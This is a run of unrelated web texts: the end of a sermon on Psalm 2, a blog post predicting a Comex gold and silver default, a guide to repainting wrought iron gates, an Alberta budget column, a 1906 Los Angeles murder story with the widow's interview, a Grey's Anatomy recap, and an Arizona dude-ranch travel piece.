that cannot be resisted. Every act of lawlessness will be dealt with swiftly and justly according to God&#x2019;s righteous standards. He will &#x201c;dash to pieces like a potter&#x2019;s vessel&#x201d; (v. 9b) all unrepentant rebels.</p>   <p> <i>Man&#x2019;s Repentance</i> (vv. 10-12) So the reign of the Lord Jesus Christ was already declared before He suffered and died on the cross. But the cross was necessary to provide a way for sinners to be made saints in the kingdom. Now, having endured the cross, He has been resurrected and glorified as Lord. He presently waits in heaven until the Father orders His return to earth (Rev. 14:14-16). Until then, sinners are afforded time to repent.</p>   <p> That is the message to rebellious mankind represented in verse 10 by its leaders &#x2014; the &#x201c;kings [and] judges of the earth.&#x201d; These are called upon to &#x201c;be wise [and] instructed&#x201d; regarding God&#x2019;s decree about Christ&#x2019;s reign. If they are wise, and if they learn anything from the truth of God&#x2019;s sovereign kingdom, then they should respond with repentance.</p>   <p> True repentance is reflected in the final two verses by:</p>   <p> &#x2013; A willingness to &#x201c;serve the LORD with fear.&#x201d; That is, a person will obey God with reverence. &#x2013; A desire to &#x201c;rejoice with trembling.&#x201d; That is, a person will humbly praise God for His mercy and grace in salvation. &#x2013; A commitment to &#x201c;the Son&#x201d; as God&#x2019;s anoointed King. To &#x201c;kiss&#x201d; (perhaps &#x201c;embrace&#x201d;) Him is a symbolic act of submission and allegiance. It is a recognition of His omnipotence.</p>   <p> The last portion of verse 12 gives us the only two options one has in response to Christ before His glorious return &#x2014; resist or repent. If you fail to embrace Him now &#x201c;when His wrath is kindled but a little,&#x201d; then the LORD will be &#x201c;angry&#x201d; with you, and &#x201c;you [will] perish in the way.&#x201d; That is to say, you will die in your sins (Jn. 8:24) because you have not sought His forgiveness. This seals your eternal damnation. Unless and until you repent, you remain under the condemnation of God&#x2019;s Law, which demands the sentence of death for rebels (Rom. 3:9-20). His wrath is temporarily restrained against you by mercy, but you still face certain judgment without repentance.</p>   <p> There is the promise of blessing for &#x201c;all those who put their trust in Him.&#x201d; These are happy (&#x201c;blessed&#x201d;) because forgiveness and eternal life are theirs in His kingdom. They have believed that Jesus Christ is the Son of God, and they have life in His name through faith (Jn. 20:31). There is no condemnation for those who are in Christ Jesus (Rom. 8:1). They are no longer under the law&#x2019;s sentence of death because, in grace, God provides an atoning sacrifice in His Son&#x2019;s death. The blessedness of the saints is that they no longer have to fear the Lord&#x2019;s wrath. They are, instead, reconciled to Him and adopted into His family with a full pardon (Rom. 8:14-17).</p>   <p> Psalm 145:8-13 speaks of the astounding opportunity people have in this present time to repent and submit to Christ as Lord and Savior. It also tells of the believer&#x2019;s opportunity to bear witness to God&#x2019;s kingdom.</p>   <p> <i>The LORD is gracious and full of compassion, Slow to anger and great in mercy. The LORD is good to all, And His tender mercies are over all His works.</i></p>   <i> <p> All Your works shall praise You, O LORD, And Your saints shall bless You. They shall speak of the glory of Your kingdom, And talk of Your power, To make known to the sons of men His mighty acts, And the glorious majesty of His kingdom.</p> </i>   <p><i> Your kingdom is an everlasting kingdom, And Your dominion endures throughout all generations.</i></p>   <p> God&#x2019;s sovereign kingdom is a reality. It is not some idealistic notion to be considered as if we were watching a movie or reading a novel. No, it is a matter of life and death for each and every one of us in every generation.</p>   <p> Although the rebellion is permitted to continue for the time being, it will be crushed when the Lord Jesus Christ returns to fulfill God&#x2019;s decree. Until then, the call to repentance continues. Have you repented of your sin and placed your trust entirely in the Son of God? Do you reverently obey Him, humbly praise Him, and embrace Him as your King? If that is the case, then you are truly blessed!</p>   <p>Return to the </p>   <p><span> &#xa9; Copyright 1997-2015 Richard E. Clayton, Jr. All rights reserved.</span></p>  </div>  
   <div>   <p><strong>Orwell would blush over what&#x2019;s being done to our system if he were alive.</strong> &#xa0;&#x2013; Investment Research Dynamics..<strong>.I think a lot of precious metals futures contracts are going&#xa0;to&#xa0;undergo a disappearing act</strong>. &#xa0;&#x2013; John Titus of </p>   <p>The CME curiously reported that it received notice from the Federal Reserve that it is authorized to open an account at the Fed which would &#x201c;allow it to better safeguard cash deposited by its traders&#x201d; &#xa0;.</p>   <p>This is event is notable for several reasons. &#xa0;First and foremost is the fact that the CME was designated as a &#x201c;systematically important&#x201d; financial institution as part of the Dodd-Frank &#x201c;hoodwink the taxpayer&#x201d; Act. &#xa0;If anyone can explain to me why a corrupted derivatives clearinghouse and trading exchange is &#x201c;systematically important,&#x201d; I will receive the explanation with an open mind.</p>   <p>To be quite frank, no bank is systematically important, especially the big banks which are continuously wrist-slapped for committing criminal acts of fraud and screwing the public. As has been demonstrated, the &#x201c;systematically important&#x201d; designation is nothing more that a guarantee to the banks that Taxpayer money will be tapped to ensure bonus payments may remain uninterrupted in the event of a bank collapse.</p>   <p>Another puzzling aspect of the CME&#x2019;s decision to open a custodial account at the Fed is in the CME&#x2019;s statement that the Fed account will allow it to better &#x201c;safeguard&#x201d; cash deposited by its traders. &#xa0;Note that the account is limited to &#x201c;clearing members proprietary margin&#x201d; accounts. &#xa0; This would be the cash put up by Comex clearing members &#x2013; like the Too Big To Fail Banks (JP Morgan, Goldman, Citi, HSBC etc) &#x2013; against margin requirements.</p>   <p>Why is a Fed custodial account any better than a custodial account held by a big bank? &#xa0; <strong><em>Is this an unintended signal from the Fed that the big banks are no longer safe as custodians of cash deposits?&#xa0;</em></strong></p>   <p>To me this reeks of the CME enabling a mechanism that &#x201c;ring-fences&#x201d; any cash equity put up by clearing members for the purposes of protecting that cash against an event of&#xa0;default or bankruptcy. &#xa0;It would give the CME control over this cash. &#xa0; This is what occurred when Jon Corzine incinerated MF Global and JP Morgan was able to grab any and all available collateral for its own benefit.</p>   <p>Again, this suggests to me that CME is concerned about the risk embedded in the proprietary futures and derivatives positions of its clearing members. &#xa0;I would suggest that the CME is specifically nervous about the precious metals futures positions held by JP Morgan, HSBC and Scotia.</p>   <p>With the absurd imbalance between Comex gold/silver contracts and the amount of underlying physical gold/silver bars held at the Comex for delivery, it&#x2019;s not a question of &#x201c;if&#x201d; the Comex eventually defaults but a question of &#x201c;when.&#x201d; &#xa0; Anyone who disagrees with this assertion is either in a state of pathetic denial or appalling&#xa0;ignorance.</p>   <p>Don&#x2019;t forget that Comex contracts have a &#x201c;force majeur&#x201d; provision which enables the cash settlement of these contracts. &#xa0;Given that the outrageously large short positions in gold and silver futures contracts are primarily held by the big banks, who also happen to be clearing members, the move by the CME to ring-fence cash collateral at the Fed which is deposited by the big banks who are short gold/silver futures expressly suggests that an event of default may be closer than any of us realizes.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>  
   <div>   <p>Wrought <b>iron</b> <b>gates</b> are beautiful as they are usually painted in at least two colours, with the colours intertwining to reveal threads of gold or silver amidst another bold colour. If you just look around on a site like , you will concur.&#xa0;However, just like any other object exposed to rain and shine, wrought <b>iron</b> <b>gates</b> are not spared from the elements. Whenever your gate has faded, here is how you can paint it yourself:</p>   <p>1. Remove rust</p>   <p>Before you start painting, you&#x2019;ll need to remove any rust from the gate to ensure a smooth finishing. Use a wire brush or a scraper to remove rust from the gate.</p>   <p>2.&#xa0; Remove old paint</p>   <p>Without removing the existing paint, the new paint will not hold well onto the surface as well as cause unevenness. Use sandpaper of medium coarseness to remove all the chipped or peeling paint.</p>   <p>3. Wipe the gate</p>   <p>Use a dry rag to wipe the gate clean of any rust and paint debris. Alternatively, you may also use a soft brush as long as no dust accumulates on your gate.</p>   <p>4. Protect nearby items</p>   <p>Any paint job will be a messy one regardless how careful you are. Cover nearby objects, even plants, with cloth or newspapers. You may want to tape the newspapers in place bearing in mind that wind will displace the newspapers. If you are covering your plants, dampen them with a list mist of water before doing so.</p>   <p>5. Apply a coat of primer</p>   <p>Now that you are ready to start the painting works, first apply a coat of primer. This primer serves as an undercoat to minimize the rusting of the gate. Primers are available in two forms &#x2013; liquid and in aerosol cans. If there are intricate patterns on your gate, the aerosol would be more convenient or else you would find yourself wrestling with the paint brush in hard-to-reach areas. Make sure that you stir the primer well if you are using the liquid form, or shake the aerosol can well.</p>   <p>6. Let the primer dry</p>   <p>Primers usually take 1 to 3 hours to dry completely. This time may differ depending on the weather. The primer must dry completely before you start painting the gate for the best results.</p>   <p>7. Paint the gate</p>   <p>For wrought <b>iron</b>, use rust-inhibitive enamel paint meant for steel or metal. Using the wrong paint will cause the paint to not adhere to the surface well. Again, choose the most convenient form of paint suitable with the designs on your gate. If you are using aerosol paint, hold the can about 3-4 inches away from the gate so prevent too much paint from being sprayed and subsequently dripping and causing dried &#x2018;bumps&#x2019; of paint on your gate.</p>  </div>

   <div>   <figure>    <figcaption>     <p><span>Joe Ceci, Alberta Minister of Finance &amp; President of the Treasury Board, displayed his 2016 budget boots in Edmonton on April 13, 2016.</span> <span><span>Larry Wong</span> / <span>Postmedia</span></span> </p>    </figcaption>   </figure>    <div>    <p>There&#x2019;s nothing novel about Alberta budget deficits. What is new &#x2014; and what alarms so many people &#x2014; is that Alberta now has an NDP government that doesn&#x2019;t hate the very idea of deficits, or even pretend to.</p>    <p>Premier Rachel Notley&#xa0;may have to learn.</p>    <p>If there&#x2019;s an iron law of Alberta politics, it&#x2019;s that big deficits cut short careers. Wrong-way cash flows helped abbreviate the terms of three PC premiers: Don Getty, Ed Stelmach and Alison Redford.</p>    <p>On Thursday, we&#x2019;ll see a budget deficit above $10 billion, which is scary by any standard, and the biggest of all Alberta whoppers when adjusted for inflation.</p>    <p>The reality&#xa0;is that a single province with four million people will run a deficit one-third the size of the national government&#x2019;s.</p>    <p>Since 1984-85, Alberta has run 17 deficits and 15 surpluses. The long-view Alberta experience is of more red ink than black. The colour doesn&#x2019;t really bother us that much; it&#x2019;s the quantity that counts.</p>    <p>Now there&#x2019;s this shortfall of up to $10.4 billion. This is the point where even progressives who believe in stimulus spending start to get nervous.</p>    <p>Overspending on such a scale becomes a gamble with ever higher stakes.&#xa0;Only a surging&#xa0;economy will slowly bring things back into normal balance (&#x201c;normal&#x201d; being a state of trivial surpluses or deficits, with capacity to pay down debt, while funding growth and&#xa0;protecting services.)</p>    <p>Alberta isn&#x2019;t good at that kind of moderation. When oil prices crashed in 1986-87, Premier Don Getty, who died&#xa0;recently, ran a deficit of just over $4 billion.</p>    <p>That would total nearly $8 billion in today&#x2019;s dollars. The impact was extremely&#xa0;dire at a time&#xa0;when provincial revenue was still less than $10 billion.</p>    <p>After the world financial crisis of 2008-09, Stelmach booked a deficit of $3.3 billion in 2010-11.</p>    <p>That was&#xa0;especially shocking because memories were still fresh of&#xa0;13 straight surplus budgets during the Ralph Klein years.&#xa0;</p>    <p>Stelmach&#x2019;s successor, Redford, clocked her own monster in 2012-13, when the deficit ran just below $4 billion.</p>    <p>There were many reasons for her fall, but she&#xa0;might have been around a lot longer if she could have said, &#x201c;Yeah, I know about the sky palace, but how about that surplus?&#x201d;</p>    <p>Klein&#x2019;s own foibles remained charming quirks as long as he booked a surplus every&#xa0;year. Two years in a row, the surplus topped $8 billion. Natural gas at US$14 will do that for a politician.</p>    <p>PC premiers&#xa0;always talked a tough game on spending and deficits. But in later years they were deeply conflicted, believing in frugality but unable to resist the lure of political spending.</p>    <p>The auditor general&#x2019;s latest report provides the classic example: The PCs promised dozens of schools they didn&#x2019;t have the money to pay for or the plans to build.</p>    <p>Jim Prentice, when he was premier, promised 55 more schools even though&#xa0;earlier pledges were already proving dubious. And he vowed to cut spending at the same time.</p>    <p>Finally, the PCs collapsed in a pile of their own contradictions.</p>    <p>Notley&#x2019;s New Democrats are not contradictory. They admit they&#x2019;re spending big. They don&#x2019;t try to claim their restraint measures can contain this year&#x2019;s deficit.</p>    <p>Their view is always more social than fiscal. They would rather save one job than cut $1,000 in spending. They won&#x2019;t add more unemployment to 110,000 layoffs, and that means protecting&#xa0;public sector jobs.</p>    <p>Notley and her finance minister, Joe Ceci, may&#xa0;show a path to balance in Thursday&#x2019;s budget. If so, the calculations will necessarily be encouraging but largely fictional, because no one really knows what the future holds for Alberta&#x2019;s economy.</p>    <p>The New Democrats obviously have a clear vision of the future they want. Thriving green startups will hum alongside&#xa0;a healthy energy industry, driving up revenues, as Prime Minister Justin Trudeau opens yet another national pipeline, cheered by First Nations and environmentalists.</p>    <p>All this would be wonderful. It might even happen.</p>    <p>But the more likely Alberta reality, unfortunately, is that another premier will collide head-on with her own deficits.</p>    <p><em>Don Braid&#x2019;s column appears regularly in the Herald</em></p>   </div>  </div>

   <div>   <p> <span>/</span> <span>, , , , , , , , </span> <span>/</span> </p>   <p> <time>March 2, 2010</time> </p>   <div>    <div>     <div>      <p>Aurellia Scheck, a 19-year-old laundry girl, loved Ernest Stackpole, a handsome, well-off young man, ten years her senior, who had come to Los Angeles from out east and rented a room in her mother&#x2019;s boarding house. Together, she and Ernest plotted to murder Aurellia&#x2019;s husband Joel, a plumber, so that they could collect the $500 for which his life was insured.</p>      <p>On June 14, 1906, Aurellia let Stackpole into the bedroom at the rear of 524 San Julian street where Joel lay sleeping, and Stackpole shot Joel &#x2013; once in the heart and once straight through his forehead.&#xa0;</p>      <p>Aurellia claimed that two burglars had fired their pistols when Joel woke up and surprised them. The police didn&#x2019;t believe her, not least because armed burglars were rare in the San Julian street area in those days, there being little worth stealing in any of the dilapidated houses.</p>      <p>The lovers were arrested and Aurellia soon cracked under interrogation, turning state&#x2019;s witness in exchange for immunity from prosecution. After a trial that occupied the front pages of the city&#x2019;s newspapers that summer, Stackpole was sentenced to life imprisonment, and Aurellia was remanded in custody on a charge of perjury, which never came to trial but which kept her locked up for three months.&#xa0;</p>      <p>Shortly before her release from the city jail, a Los Angeles Herald reporter secured the only interview that she ever gave the press, in which she spoke about her awful life and how she had become involved in murder.&#xa0;</p>      <p>Understandably, the interview differs to a large degree from her testimony in court. In order to condemn Stackpole, she had had to damn herself, too, by describing in detail the murder plot and her part in it. Speaking to the Herald&#x2019;s reporter, she naturally tried to distance herself from the crime. Also, although the article claims to report Aurellia&#x2019;s actual words, they were obviously prettied up by the journalist, as they lapse occasionally into the purplish and melodramatic language that was a mark of the paper&#x2019;s feature pages.&#xa0;</p>      <p>Still, her story is worth reading, not only for the insight into the mind of a woman who got away with murder but for the glimpse of a life that, in its early particulars, is probably similar to the lives of many of those who drifted west in the early 20th century, heading for the bright lights and dark streets of SRO land.&#xa0;</p>      <p>&#x201c;It won&#x2019;t take long to tell all I know about myself,&#x201d; Aurelia said. &#x201c;I haven&#x2019;t been on earth very long, and while things have happened rather rapidly in my life this last trouble has so far overshadowed them all that I can think of nothing else.</p>      <p>&#x201c;I was born in lowa not quite twenty years ago. My mother and father separated two years after my birth, and after that I travelled about with my mother and sister.</p>      <p>&#x201c;My mother was a nurse of experience and she made a good living that way until she met a man whom she thought she loved.</p>      <p>&#x201c;At any rate they married, and from that time on I begun to realize what the world really was. We lived a gypsy life, travelling day and night through the hills and woods of Missouri, Arkansas, lowa and Nebraska.</p>      <p>&#x201c;It was beg for food in the day time and sleep about a camp fire out in the woods at night.</p>      <p>&#x201c;Strange fancies came to me then in those wild surroundings and I feared the dark, feared the shapes and shadows of the smoke from the camp fire and wondered what the world was made for and why we were all living on it. I have thought those same thoughts lying in my cell over there, with some woman of the town snoring off a drunken sleep within a dozen feet of me, and I have never found an answer to it.</p>      <p>&#x201c;At last, my mother separated from my father. Their last quarrel was as violent as the life had been. I can see my mother now, pointing across the Missouri river to the far bank and my father slowly trudging toward its shadowy forests. That was the way they parted, and then we came to California.</p>      <p>&#x201c;I was 11 years old then, and I managed to get one year&#x2019;s schooling, then it was work for me, hard work at the washing machine, until, I thought my back would break. It was there that I met Joel Scheck, a slender lad who worked one of the wringing machines.</p>      <p>&#x201c;I quit work there and went to work in a box factory. I spent four years at that, making berry boxes at 6 cents a hundred.</p>      <p>&#x201c;What chance did I have? I had no education, I had been reared as a gypsy and at the time when every young girl is budding into womanhood and having a good time with her friends in little entertainments I was compelled to kick away at a box making machine.</p>      <p>&#x201c;I married Joel Scheck when I was 17 years of age. He was only a boy and we went to live on San Julian street.</p>      <p>&#x201c;At that time I went to work at my mother&#x2019;s lodging house. I did the work for her for a while, and would then hurry home and do the work at my own home.</p>      <p>&#x201c;I had never had the fun that other girls have, of going to theaters, and entertainments, so that what wonder was it that I should be lonesome when my husband left me in the evening? He rarely ever spent an evening with me.</p>      <p>&#x201c;He went out early and came in late, and I was there all by myself, fearfully lonesome, while he was out enjoying himself.</p>      <p>&#x201c;Then came the voice of the tempter.</p>      <p>&#x201c;It was at my mother&#x2019;s house that I met Ernest Stackpole. He was a boarder there, and in that way we met every day. He said he was just in from Arizona, and he always had plenty of money.&#x201d;</p>      <p>(At this point, I should state what Aurellia did not then know: that the dashing young Stackpole was actually a convicted burglar and armed-robber, who had just fled Utah after a successful heist.)</p>      <p>&#x201c;At first he would tease me when I went to his room to make up the bed and sweep. Then he wanted me to drink, and he showed me what nice drinks he could make. I paid little attention to him until he became so persistent that in a moment of weakness I accepted a small glass of wine from him.</p>      <p>&#x201c;That was the beginning of the end. After that he was always importuning me to drink. When my husband was around we all three drank, and so I didn&#x2019;t think it was so bad after that.</p>      <p>&#x201c;Then we gradually became more intimate. We went to downtown cafes at all hours of the night, my husband being always along. We went to theaters and entertainments, to beaches and parks, and Stackpole was always putting up the money.</p>      <p>&#x201c;My husband drank the liquor and accepted the hospitality and never paid a cent. I was only a girl and knew nothing of the ways of a girl&#x2019;s ruination. At the cafes I saw other young girls drinking. Many of them became drunk and had to be carried away.</p>      <p>&#x201c;Stackpole offered me all the things I had never enjoyed. He spent money lavishly. He took us places, and for the first time In my life. I had a chance to see pretty plays and enjoy the beaches.</p>      <p>&#x201c;The evenings were awfully lonesome until he came, and then it was my downfall.</p>      <p>&#x201c;I thought my husband was unkind to me, and the easy, polished ways of Stackpole appealed to me. A woman sometimes forgets the right for the easy downward path.</p>      <p>&#x201c;It was a sorry day for me that I accepted Stackpole&#x2019;s invitation to go to an afternoon matinee, for we later went to a cafe. There he made a drink for me, and when I had swallowed the stuff I didn&#x2019;t know what had happened to me. My mind was a blank. When I came to my senses I was in a room with him.</p>      <p>&#x201c;Then he had me, and he knew it. When he went away he wrote five times to me before I answered, and then he began to talk of the killing. I did not appreciate what it meant until he had written many times. I dared not tell my husband, for I feared Stackpole. He told me that if I told he would kill us all.</p>      <p>&#x201c;To protect my husband I dared say nothing. When he returned he told me to come to him or the killing would begin at once.</p>      <p>&#x201c;What could I do? I went to him and was his slave again. I did as he said. I drank the drugs he gave me and did not know what I was doing. I threatened to tell the police, and he said that if I did it would only precipitate the murder, for he would kill us all. On the night of the killing he told me that he would kill us all if we dared to say anything against him.</p>      <p>&#x201c;The events of that night seem to be more like a hideous dream, a dream which has been with me constantly until I feel that I will lose my mind. I see it all over again until my eyes start from my head.</p>      <p>&#x201c;Would l care If they had hanged Stackpole? I would not have anyone hanged, but I have ceased to think of him. I never want to see him again.</p>      <p>&#x201c;I am homesick, so homesick until I feel that I will go crazy.&#x201d;</p>      <p>The Herald journalist asked what Aurellia was homesick for &#x2013; her mother? The lonely surroundings of her previous life?</p>      <p>&#x201c;Neither,&#x201d; she answered, her eyes beginning to fill with tears.</p>      <p>Perhaps she was homesick for Joel, the journalist suggested. (&#x201c;A moment later I realized how heartless the question was&#x201d;, he admitted.) He saw her reel back as if she had been struck. Then she slumped and held her face in her hands.</p>      <p>&#x201c;Oh, how I miss him,&#x201d; she said. &#x201c;In the daytime I want him until I wish I could die. But at night I lie over there in my cell and look up at the darkness and wonder if he can know how I want him. I see his face and hear his voice calling to me and there I lie until the first gray light of the morning streaks in through the east windows and the birds in the matron&#x2019;s room welcome the morning.</p>      <p>&#x201c;Then I feel that I have lost all that is worth while in life and it fairly tears my soul from me.&#x201d;</p>      <p>The journalist left after asking about what she planned to do when she was released. (Live with her brother in Garvanza. Learn a profession. Make someone happy.) As he stood outside the door, waiting for the matron to open the <b>iron</b> <b>gates</b>, he heard &#x201c;a low, heartbreaking sob&#x201d; from inside the room; the last recorded utterance of Aurellia Scheck.</p>      <p>At the time of Aurellia&#x2019;s release, Ernest Stackpole was just beginning his life sentence in San Quentin. He was violent enough to quickly establish himself as a jailhouse bully, but he occupied this station for only a few months until he received a humiliating beating from a four-foot-high Puerto Rican dwarf who had been imprisoned on a charge of statutory rape.&#xa0;</p>      <p>He was paroled in 1927, after serving 21 years &#x2013; he was in his 50s, and seemed &#x201c;quite an old man&#x201d;, according to the warden. He immediately resumed his career of crime and was captured the following year after being shot in the leg during a hold-up in Sacramento. He spent the rest of his life in jail.&#xa0;</p>      <p><em>Sources: Los Angeles Herald, Sep 16, 1906 (the main interview and picture of Aurellia). The case was reported on frequently in the same paper from June 15 to August 31, 1906.

   <div>   <div>    <p>photo: abc</p>   </div>   <strong>Grey&#x2019;s Anatomy</strong>   <em>Take It Back</em>   <p>Original Air Date: Feb 27, 2014</p>   <p><strong>Karen Belgrad &#x2013; Managing Editor</strong> <em>karenbelgrad@thetwocentscorp.com</em></p>   <p>When we left off last year, Grey&#x2019;s had many, many loose ends leaving viewers wondering what was coming next. Would April choose Matthew or Avery? Would Alex&#x2019;s father live? What happened to Ross? Were Callie and Arizona and Bailey and Ben over? Would Derek choose the White House over his promise to Meredith? And were Meredith and Cristina finally done fighting?</p>   <p>Well, guess what&#x2026; they managed to answer every single question. While it was a lot of content for an hour of television, it breezed by in a very non-patient heavy hour. This was purely about our doctors tonight, with only a small side of medical mayhem. So let&#x2019;s get to it&#x2026;</p>   <p><strong>The Wedding:</strong> First and foremost, April came running out of the chapel with Avery, leaving Stephanie and Matthew to lick their wounds. She immediately began to panic over her impulsive decision, getting out of the car in the middle of a country road. Derek and Meredith bickered over his looming presidential work, although she seemed to accept it wasn&#x2019;t something he could turn down. Bailey blew up at Ben, feeling as though she was returned to her first marriage, with someone who didn&#x2019;t value surgery. Ben was adamant that he loved surgery, he just loved being with her more. Arizona lashed out at Callie that she didn&#x2019;t want to be fixed and that their old condo wasn&#x2019;t her home anymore. And while Jimmy hovered near death, Alex wanted him arrested or fired, and Ross slept on a bench.</p>   <p><strong>Three weeks later&#x2026;</strong></p>   <p><strong>Ben and Bailey:</strong> Ben&#x2019;s love of surgery was enough to fix all that ailed their relationship. Remember when Heather Brooks died? Well, that left an opening in the surgical resident program, so Ben is officially a second year resident at Grey Sloan Memorial Hospital. He&#x2019;s mercilessly teased by the other residents, but is clearly Richard&#x2019;s student pet. And Bailey is completely sunshine and happy again. Oh, and pizza and hamburgers give Ben heartburn.</p>   <p><strong>Callie and Arizona:</strong> Changing location changes outlooks. The solution to the twosome&#x2019;s problem&#x2026; buy a new house. Granted, it&#x2019;s a murder house, but it&#x2019;s fresh start without memories of hospital beds or being carried into a shower. Callie is still on the fence about their issues, but Arizona, without promising smooth waters, is more relaxed and happy then we have seen her in forever.</p>   <p><strong>Alex:</strong> Jimmy&#x2019;s still hanging on, mostly because Alex promised that his estranged wife Naomi and son Nicky were on their way. What he didn&#x2019;t count on is that his anger towards his father is only matched by Naomi&#x2019;s. She does show up, but it&#x2019;s only because she believe that Jimmy was already dead and she wanted to reclaim a guitar he stole from her. She leaves without seeing him, guitar in hand. Alex, after pummeling Ross, sits by his father&#x2019;s bedside, lies that Naomi and Nicky are still coming, and gives his dad permission to go. Jimmy dies, as a Alex mutters &#x201c;you sonafabitch&#x201d; to himself.</p>   <p><strong>Ross:</strong> Ross is back (and rested), but not by Owen&#x2019;s choice. Owen fought to have him fired, while the board, especially Cristina, fought for a second chance. But while Richard tries to mentor him gently, Owen is blazing mad and challenging the resident at every turn. Ross apologizes to Alex (which is what earned him the beating) and quietly tries to regain his footing in his career. Richard calls out Owen for possibly being angrier that Ross was sleeping with Cristina, rather than his medical mistake.</p>   <p><strong>Meredith/Cristina: </strong>The two are besties again. They operate together, bond, and all is right with the world.</p>   <p><strong>Derek:</strong> Derek spends the hour being vetted by the White House. They raise an eyebrow that he married a former student, are content that Amelia (Private Practice) is still clean, but do find a red flag in his files. It turns out Derek sends $3500 a month to the mother of a Michael Betcher. He confides in Meredith that Michael was a high school classmate that he crosschecked in hockey, leaving him with a brain bleed in a vegetative state. It flies in the face of his telling Bailey a few seasons ago that he was a scrawny band nerd, but I&#x2019;m sure we&#x2019;re not supposed to remember that. Meredith is still angry with him, but unlike irrational Meredith of last fall, she doesn&#x2019;t seem to be unruly, just irritated.</p>   <p><strong>Jo/Alex:</strong> When Naomi was at the hospital, Alex introduces Jo as his fianc&#xe9;, which shocks the resident. It turns out Alex&#x2019;s speech about wanting to be with her forever was his idea of a proposal, which is reminiscent of when he asked Izzie to be exclusive by asking if he could still sleep with nurses. Jo tells him she&#x2019;s not ready for marriage and that he&#x2019;s only pushing for commitment out of grief. </p>   <p><strong>Avery/April/Stephanie:</strong> It comes out via Leah that after all of the wedding shenanigans, that all of our doctors are now alone. Stephanie is avoiding Avery at all costs, while he is longing to apologize. Stephanie has a &#x201c;cat-man&#x201d; patient, who altered his appearance (tattoos, piercings, plastic surgery) at nineteen to look like a feline. He admits that he now barely leaves his house, so Stephanie uses Avery&#x2019;s guilt, telling him that he can&#x2019;t make her feel better, but he can do pro-bono work to fix the patient. Stephanie, still sad, talks to Leah who bemoans the fact that so many attendings (Cristina, Alex, Arizona, Avery) have been involved with residents (Ross, Jo, Leah, Stephanie). She pushes her to do &#x201c;something about it.</p>   <p>Next thing we see is an emergency board meeting to discuss complaints of sexual harassment, quid pro quo harassment, and hostile work environment. At the boards suggestion, they discuss implanting a zero tolerance policy for workplace relationships between superiors and subordinates, current marriages excluded (Ben/Bailey).</p>   <p>Jackson returns home&#x2026; and advises April that their relationship may not be a secret much longer. They embrace and we spy a wedding band on April&#x2019;s telltale finger. Flashing back to the side of the road from the top of the hour, we see them wonder what comes next. Not wanting to go back to dating, they make the impulsive decision to drive thirteen hours to Lake Tahoe to elope.</p>   <p>And&#x2026; exhale! That was a lot of story for sixty minutes!

   <div>   <h2>Travel Tuesday</h2>   <div>    <p>Cowboy cookout</p>   </div>   <p>For our cowboy weekend, Ken and I traveled to s, a 20,000 acre guest ranch on the edge of <strong>Wickenburg, Arizona</strong> less than an hour&#x2019;s drive west from the Phoenix airport.</p>   <div>    <p>The horse corral at Rancho de los Caballeros</p>   </div>   <p>People who know us, know that we are not the typical &#xa0;in-the-saddle-before-breakfast types. We managed to spend from Friday noon until Sunday noon and never get within touching range of a horse! Yep, pardner, this is not your grandpa&#x2019;s dude ranch. &#xa0;The first clue would be the aroma of freshly cut grass that greets you along the entrance road&#x2013;the 18-hole golf course. And except for the time when some dude left the gate to the horse run open and the horses galloped all over the fairways&#x2013;the beautifully maintained greens are for people only.</p>   <div>    <p>Los Cabelleros golf course</p>   </div>   <p>In all honesty, as non-riders, we were in the minority. Most of the guests were there because they love horseback riding vacations. And many have been coming back every year for decades to ride one of the 100 horses available. Trail rides, lessons, and even team roping keep the equine crowd busy.&#xa0;Special attention is paid to little cowpokes and families love to gather around the scrapbooks that go back to the early 1950&#x2032;s and see how their family has grown up since they first came to Los Caballeros. So for the horseless dudes like us&#x2013;what&#x2019;s to do? Well eat, for one thing. &#xa0;Breakfast and lunch are extensive buffets. We picked up our plates and headed poolside in the picture-perfect October sunshine. &#xa0; Surprisingly, the code of the West at this here dude ranch insists on jackets (or Western vests) for men at dinner. A bit of the fifties remains. Fortunately, women are not required to wear skirts and white gloves.</p>   <div>    <p>Sun C brand of Los Caballeros</p>   </div>   <p>The &#xa0;rambling one-story main building includes a living room with a huge copper clad fireplace, the formal dining room for dinner, the less formal buffet area &#xa0;and a lounge area in the back.The public area decor is 1940&#x2032;s Mexican with walls painted in brilliant primary yellows and reds, carved and hand painted beams and window and door frames. More recent Western paintings displayed throughout are for sale, but what I covet is the priceless collection of tinware that creates murals, mirror frames and room dividers. I have always liked the little tinware pieces made into lamps and wall sconces that you can buy in any Mexican crafts store. &#xa0;But the tinware decorating the walls at Los Caballeros is like the difference between high Renaissance and fingerpainting.</p>   <div>    <p>Tin Work</p>   </div>   <p>The hand-crafted Mexican and Western feel continues in the rooms which open onto winding paths through immaculately groomed desert landscape. A set of seven smaller rooms with hand painted furniture date back to 1947 when workmen scooped up mud from the ranch &#xa0;and molded handmade adobe bricks for the walls. Newer and larger rooms envelop the visitor in deeply cushioned pillow top mattresses, cow-hand sized sofas and chairs with leather, iron and wood prevailing. Forget bunk beds and scratchy wool blankets, cowboy.</p>   <div>    <p>Pilllow-top bed with Western symbols</p>   </div>   <p>This is luxury. The suites include a kitchen (without pans and with very few dishes), fireplaces, free Wifi, flat screen TVs, bathrooms big enough to bring in your horse (although I doubt they&#x2019;d appreciate it.) Rooms open on to patios where you can sit and watch the javelinas and coyotes stroll by in the evening.</p>   <div>    <p>Hassayampa Nature Preserve Trail with Dick, the Naturalist</p>   </div>   <p>We took a walk in the nearby with Los Caballeros own Naturalist; and a with Mike, a knowledgeable guide who spent a lifetime riding the range before turning tour guide. Between the two of them, we felt pretty sure we could survive for longer than fifteen minutes in the desert, and developed a new appreciation for plants that we have lived around for a long time.</p>   <div>    <p>Sun peeking through near Vulture Peak</p>   </div>   <p>The jeep ride jounces over old mine roads out toward Vulture Peak, a volcanic plug that dominates the landscape, and the site of mining operations that gave birth to Wickenburg in the first place. And ahhhh, the Spa.</p>   <div>    <p>Spa courtyard</p>   </div>   <p>I opted for the Hohokam Massage, figuring I should take advantage of the essential oils of some of those desert plants. &#xa0;The Spa is the newest addition to the ranch and they have gone all out to make it a first class operation. &#xa0;Natural desert landscaping&#x2013;a surrounding of cholla cactus, saguaros and lacy mesquite trees&#x2013; gives you a strong sense of place. To cap off the experience, Caballeros Spa has created a labyrinth behind the spa. As you thread your way around the desert-stone-marked sprial path with a view of the mountains in the distance, you feel at one with the Southwest.</p>   <div>    <p>Labyrinth behind Spa</p>   </div>   <p>That mellow feeling expanded to the entire universe when we walked a dirt road out to the site for the cowboy cookout. 